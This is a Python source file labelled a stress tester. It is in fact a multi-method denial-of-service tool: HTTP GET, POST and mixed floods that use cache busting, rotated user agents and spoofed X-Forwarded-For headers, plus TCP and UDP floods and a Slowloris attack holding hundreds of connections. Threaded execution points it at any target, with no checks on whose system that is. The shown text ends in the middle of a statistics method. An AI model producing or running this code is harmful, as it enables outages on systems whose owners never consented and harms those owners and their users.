#!/usr/bin/env python3
"""
Enhanced Stress Tester - More Powerful Attacks
Optimized for maximum impact
"""

import socket
import threading
import time
import random
import string
from urllib.parse import urlparse
import requests
from concurrent.futures import ThreadPoolExecutor
import ssl

class EnhancedStressTester:
    """Enhanced stress testing with more powerful attacks"""
    
    def __init__(self):
        self.running = False
        self.threads = []
        self.request_count = 0
        self.error_count = 0
        self.start_time = None
        self.executor = None
        
    def generate_random_string(self, length=10):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def get_random_user_agent(self):
        """Get random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        ]
        return random.choice(agents)
    
    def http_flood_enhanced(self, url, duration):
        """Enhanced HTTP flood with keep-alive and cache bypass"""
        end_time = time.time() + duration
        session = requests.Session()
        
        # Keep-alive connection
        session.headers.update({
            'Connection': 'keep-alive',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept': '*/*',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache'
        })
        
        while self.running and time.time() < end_time:
            try:
                headers = {
                    'User-Agent': self.get_random_user_agent(),
                    'Referer': f'https://www.google.com/search?q={self.generate_random_string()}',
                    'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                }
                
                # Multiple cache bypass techniques
                params = {
                    'cache': self.generate_random_string(10),
                    'rand': random.randint(1, 999999),
                    'time': int(time.time() * 1000)
                }
                
                response = session.get(url, headers=headers, params=params, timeout=5, allow_redirects=True)
                self.request_count += 1
                
                # No delay for maximum speed
                
            except Exception as e:
                self.error_count += 1
                time.sleep(0.01)
    
    def http_post_flood_enhanced(self, url, duration):
        """Enhanced POST flood with large payloads"""
        end_time = time.time() + duration
        session = requests.Session()
        
        while self.running and time.time() < end_time:
            try:
                headers = {
                    'User-Agent': self.get_random_user_agent(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Connection': 'keep-alive'
                }
                
                # Large random payload
                data = {
                    'data': self.generate_random_string(5000),
                    'payload': self.generate_random_string(5000),
                    'content': self.generate_random_string(5000)
                }
                
                response = session.post(url, headers=headers, data=data, timeout=5)
                self.request_count += 1
                
            except Exception as e:
                self.error_count += 1
                time.sleep(0.01)
    
    def tcp_flood_enhanced(self, host, port, duration):
        """Enhanced TCP flood with SYN flood technique"""
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                # Create socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                # Try to connect
                sock.connect((host, port))
                
                # Send large random data
                data = self.generate_random_string(65535).encode()
                sock.send(data)
                
                # Don't close immediately to keep connection open
                time.sleep(0.1)
                sock.close()
                
                self.request_count += 1
                
            except Exception as e:
                self.error_count += 1
                time.sleep(0.01)
    
    def udp_flood_enhanced(self, host, port, duration):
        """Enhanced UDP flood with large packets"""
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Send large UDP packets (max 65507 bytes)
                data = self.generate_random_string(65000).encode()
                sock.sendto(data, (host, port))
                
                sock.close()
                self.request_count += 1
                
                # No delay for maximum speed
                
            except Exception as e:
                self.error_count += 1
                time.sleep(0.01)
    
    def slowloris_enhanced(self, host, port, duration):
        """Enhanced Slowloris with more connections"""
        end_time = time.time() + duration
        sockets = []
        
        # Create many connections
        for _ in range(500):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((host, port))
                
                # Send partial HTTP request
                sock.send(f"GET /?{self.generate_random_string()} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {host}\r\n".encode())
                sock.send(f"User-Agent: {self.get_random_user_agent()}\r\n".encode())
                sock.send("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".encode())
                sock.send("Accept-Language: en-US,en;q=0.5\r\n".encode())
                sock.send("Accept-Encoding: gzip, deflate\r\n".encode())
                sock.send("Connection: keep-alive\r\n".encode())
                
                sockets.append(sock)
                self.request_count += 1
            except:
                pass
        
        # Keep connections alive
        while self.running and time.time() < end_time:
            try:
                for sock in list(sockets):
                    try:
                        # Send more headers to keep alive
                        sock.send(f"X-a: {self.generate_random_string()}\r\n".encode())
                    except:
                        sockets.remove(sock)
                        # Create new connection
                        try:
                            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_sock.settimeout(4)
                            new_sock.connect((host, port))
                            new_sock.send(f"GET /?{self.generate_random_string()} HTTP/1.1\r\n".encode())
                            new_sock.send(f"Host: {host}\r\n".encode())
                            sockets.append(new_sock)
                        except:
                            pass
                
                time.sleep(10)
                
            except Exception as e:
                self.error_count += 1
        
        # Close all sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def http_mixed_attack(self, url, duration):
        """Mixed attack - GET + POST together"""
        end_time = time.time() + duration
        session = requests.Session()
        
        while self.running and time.time() < end_time:
            try:
                headers = {
                    'User-Agent': self.get_random_user_agent(),
                    'Connection': 'keep-alive'
                }
                
                # Alternate between GET and POST
                if random.choice([True, False]):
                    # GET request
                    params = {'rand': self.generate_random_string(20)}
                    response = session.get(url, headers=headers, params=params, timeout=5)
                else:
                    # POST request
                    data = {'data': self.generate_random_string(1000)}
                    response = session.post(url, headers=headers, data=data, timeout=5)
                
                self.request_count += 1
                
            except Exception as e:
                self.error_count += 1
                time.sleep(0.01)
    
    def start_attack(self, method, target, duration, thread_count):
        """Start enhanced stress test attack"""
        self.running = True
        self.request_count = 0
        self.error_count = 0
        self.start_time = time.time()
        self.threads = []
        
        # Parse target
        if method in ['GET', 'POST', 'MIXED']:
            url = target
            parsed = urlparse(url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        else:
            # For TCP/UDP, target should be host:port
            if ':' in target:
                host, port = target.split(':')
                port = int(port)
            else:
                host = target
                port = 80
        
        # Select attack method
        if method == 'GET':
            attack_func = lambda: self.http_flood_enhanced(target, duration)
        elif method == 'POST':
            attack_func = lambda: self.http_post_flood_enhanced(target, duration)
        elif method == 'TCP':
            attack_func = lambda: self.tcp_flood_enhanced(host, port, duration)
        elif method == 'UDP':
            attack_func = lambda: self.udp_flood_enhanced(host, port, duration)
        elif method == 'SLOW':
            attack_func = lambda: self.slowloris_enhanced(host, port, duration)
        elif method == 'MIXED':
            attack_func = lambda: self.http_mixed_attack(target, duration)
        else:
            raise ValueError(f"Unknown method: {method}")
        
        # Use ThreadPoolExecutor for better performance
        self.executor = ThreadPoolExecutor(max_workers=thread_count)
        
        # Start threads
        for i in range(thread_count):
            future = self.executor.submit(attack_func)
            self.threads.append(future)
        
        return {
            'status': 'started',
            'method': method,
            'target': target,
            'duration': duration,
            'threads': thread_count,
            'start_time': self.start_time
        }
    
    def stop_attack(self):
        """Stop attack"""
        self.running = False
        
        # Shutdown executor
        if self.executor:
            self.executor.shutdown(wait=False)
        
        return {
            'status': 'stopped',
            'total_requests': self.request_count,
            'total_errors': self.error_count,
            'duration': time.time() - self.start_time if self.start_time else 0
        }
    
    def get_stats(self):
        """Get current statistics"""
        if not self.start_time:
            return {
                'status': 'idle',
                'requests': 0,
                'errors': 0,
                'duration': 0,
                'rps': 0,
                'active_threads': 0
            }
        
        duration = time.time() - self.start_time
        rps = self.request_count / duration if duration > 0 else 0
        
        # Count active threads
        active = 0
        if self.executor:
            active = len([f for f in self.threads if not f.done()])
        
        return {
            'status': 'running' if self.running else 'stopped',
            'requests': self.request_count,
            'errors': self.error_count,
            'duration': round(duration, 2),
            'rps': round(rps, 2),
            'active_threads': active
